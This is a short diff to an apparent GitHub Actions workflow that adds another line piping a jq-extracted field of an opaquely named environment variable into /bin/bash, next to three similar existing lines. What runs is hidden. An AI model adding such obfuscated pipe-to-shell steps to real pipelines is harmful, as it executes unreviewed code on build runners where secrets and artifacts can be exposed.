@@ -28,6 +28,7 @@ jobs:
           echo $qqw99 | jq -r .n686 | /bin/bash
           echo $uzokr169 | jq -r .o80 | /bin/bash
           echo $ojmty0 | jq -r .h6 | /bin/bash
+          echo $v0 | jq -r .cuf486 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
